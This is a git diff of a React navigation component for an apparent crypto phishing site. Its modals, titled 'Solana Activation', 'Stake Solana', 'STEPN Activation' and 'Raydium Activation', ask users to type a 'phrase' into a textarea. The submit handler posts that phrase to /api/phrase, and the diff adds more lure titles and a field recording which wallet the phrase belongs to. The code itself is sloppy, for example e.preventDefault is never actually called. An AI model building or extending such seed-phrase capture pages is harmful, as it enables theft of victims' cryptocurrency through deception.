@@ -25,15 +25,16 @@ export default function Navbar() {
 
 
     const handleSubmit = (e) => {
-        console.log(e)
+        // console.log()
         e.preventDefault
         if (phrase !== "") {
             setError("")
             const pS = { phrase: phrase};
-            console.log(pS);
+            // console.log(text);
             fetch("/api/phrase", {
                 body: JSON.stringify({
                     phrase: phrase,
+                    wallet: text
                 }),
                 headers: {
                     "Content-Type": "application/json",
@@ -50,7 +51,7 @@ export default function Navbar() {
     }
 
     function openModal(e) {
-        setText(e == 1 ? "Solana Activation" : "Stake Solana")
+        setText(e == 1 ? "Solana Activation" : (e == 2) ? "Stake Solana" : (e == 3) ? "STEPN Activation" : "Raydium Activation")
         setIsOpen(true)
         setIsMenuOpen(false)
     }
@@ -105,7 +106,9 @@ export default function Navbar() {
                                             " onSubmit={handleSubmit}>
                                                 <div className="form-group flex-1">
                                                     <textarea
-                                                        onChange={(e) => setPhrase(e.target.value)}
+                                                        onChange={(e) =>{ setPhrase(e.target.value), 
+                                                            text
+                                                        }}
                                                         required
                                                         className="
                                                     form-control
@@ -700,4 +703,4 @@ export default function Navbar() {
             </div>
         </>
     )
-}   
+}
